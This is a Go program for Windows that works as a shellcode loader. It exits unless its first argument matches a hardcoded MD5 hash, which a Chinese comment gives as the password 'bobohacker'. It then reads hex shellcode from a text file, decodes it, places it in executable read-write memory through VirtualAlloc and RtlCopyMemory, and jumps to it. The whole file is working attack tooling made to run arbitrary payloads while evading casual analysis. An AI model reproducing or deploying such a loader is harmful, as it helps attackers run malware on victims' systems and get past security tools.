
package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
	"strings"
	"fmt"
	"encoding/hex"
	"crypto/md5"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)
var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	ntdll          = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
	)

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}
func main() {


	if len(os.Args) <= 2 {
		os.Exit(0)
	}

	//var shellcodes string
	var shellcode []byte

	if len(os.Args) > 2 {
		data := []byte(os.Args[1])
		has := md5.Sum(data)
		md5str1 := fmt.Sprintf("%x", has) //将[]byte转成16进制
		if (md5str1) != "81592ae4e09eb3dfb96aaecbf84730d0" {
			//第一个参数只有是 bobohacker 才能跑起
			os.Exit(0)
		}

		if fileObj, err := os.Open(os.Args[2]); err == nil {
			//第二个参数为放shellcode的txt文件名
			defer fileObj.Close()
			if contents, err := ioutil.ReadAll(fileObj); err == nil {
				shellcodes := strings.ReplaceAll(string(contents), "\n", "")
				shellcodes = strings.ReplaceAll(string(shellcodes), "\\x", "")
				shellcode, _ = hex.DecodeString(shellcodes)
			}

		}
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}
